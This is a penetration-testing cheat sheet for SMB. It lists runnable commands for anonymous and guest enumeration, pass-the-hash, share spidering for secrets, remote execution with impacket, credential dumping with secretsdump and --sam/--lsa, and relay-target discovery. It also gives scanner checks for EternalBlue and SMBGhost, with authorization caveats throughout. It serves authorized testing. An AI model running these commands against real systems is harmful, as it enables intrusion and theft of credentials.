# SMB (139, 445)

!!! tip "Start here"
    Fingerprint the host, check whether signing is required, then try an explicitly anonymous session. A successful null login does not guarantee share or RPC access.

---

## Enumeration

```bash
nmap -p 139,445 --script smb-os-discovery,smb-protocols,smb2-security-mode $IP
nxc smb $IP
nxc smb $IP -u '' -p '' --shares
smbclient -N -L "//$IP"
```

If null authentication fails, test guest only when default-credential checks are authorized:

```bash
nxc smb $IP -u guest -p '' --shares
```

---

## Credential Validation

```bash
nxc smb $IP -u "$USERNAME" -p "$PASSWORD"
nxc smb $IP -u "$USERNAME" -p "$PASSWORD" --shares
nxc smb $IP -u "$USERNAME" -p "$PASSWORD" --pass-pol
```

Use `--local-auth` for a local account; omit it for domain authentication. Pull the password policy before any spray, keep attempts below the observed lockout threshold, and use `--continue-on-success` only when validating multiple approved accounts.

Pass-the-hash uses the NT hash, not a captured NetNTLM challenge-response value:

```bash
nxc smb $IP -u "$USERNAME" -H "$NTLM_HASH" --local-auth
```

---

## Users and Shares

```bash
nxc smb $IP -u "$USERNAME" -p "$PASSWORD" --users
nxc smb $IP -u "$USERNAME" -p "$PASSWORD" --rid-brute
enum4linux-ng -A -C $IP
```

Connect with `smbclient` and enter the password at its prompt:

```bash
smbclient "//$IP/$SHARE" -U "$DOMAIN/$USERNAME"
```

Useful interactive commands:

```text
smb: \> ls
smb: \> get FILE_NAME
smb: \> put LOCAL_FILE REMOTE_FILE
```

List permissions or transfer a specific file without an interactive session:

```bash
smbmap -H $IP -u "$USERNAME" -p "$PASSWORD"
smbmap -H $IP -u "$USERNAME" -p "$PASSWORD" -r "$SHARE"
smbmap -H $IP -u "$USERNAME" -p "$PASSWORD" --download "$SHARE\\path\\to\\file.txt"
```

---

## Share Spidering

Start with metadata rather than downloading entire shares:

```bash
nxc smb $IP -u "$USERNAME" -p "$PASSWORD" -M spider_plus
nxc smb $IP -u "$USERNAME" -p "$PASSWORD" --spider "$SHARE" --regex 'password|secret|credential|api[_-]?key'
```

Prioritize deployment files, scripts, password databases, and application configuration: `unattend.xml`, `sysprep.inf`, `Groups.xml`, `web.config`, `*.kdbx`, and `*.ps1`.

---

## Remote Execution

Remote execution normally requires local-administrator rights and creates process, service, WMI, or scheduled-task telemetry depending on the method.

```bash
nxc smb $IP -u "$USERNAME" -p "$PASSWORD" -x 'whoami'
impacket-wmiexec "$DOMAIN/$USERNAME:$PASSWORD@$IP" 'whoami'
impacket-psexec -hashes ":$NTLM_HASH" "$DOMAIN/$USERNAME@$IP"
```

Use the [NetExec](../../tools/netexec.md), [Impacket](../../tools/impacket.md), and [Windows lateral movement](../../lateral-movement/windows.md) pages for method selection and Kerberos authentication.

---

## Credential Dumping

Local-administrator access is required. These actions read sensitive credential material and should be run only when collection is approved:

```bash
nxc smb $IP -u "$USERNAME" -p "$PASSWORD" --sam --lsa
impacket-secretsdump -hashes ":$NTLM_HASH" "$DOMAIN/$USERNAME@$IP"
```

---

## Relay Triage

Generate a list of Windows hosts that do not require SMB signing:

```bash
nxc smb $SUBNET --gen-relay-list relay_targets.txt
```

Signing not being required makes a host a potential relay destination; successful impact still depends on the relayed identity and its rights. See [Responder](../../tools/responder.md) for capture, poisoning, relay setup, and cleanup rather than duplicating that workflow here.

---

## Known Vulnerabilities

### EternalBlue (MS17-010)

Validate the missing [MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) fix without launching an exploit:

```bash
nmap -p 445 --script smb-vuln-ms17-010 $IP
nxc smb $IP -M ms17-010
```

Exploitation targets the Windows kernel and can crash the host. Confirm the OS, architecture, maintenance state, and authorization before proceeding.

### SMBGhost (CVE-2020-0796)

[SMBGhost (CVE-2020-0796)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796) affects SMBv3.1.1 compression on specific unpatched Windows 10 and Windows Server releases. A dialect result alone does not prove compression support or vulnerability:

```bash
nxc smb $IP -M smbghost
```

Treat a positive scanner result as a version/patching lead. Public kernel exploits are crash-prone and are inappropriate for routine validation on production systems.

---

## Reference

[SANS SMB Access from Linux cheat sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
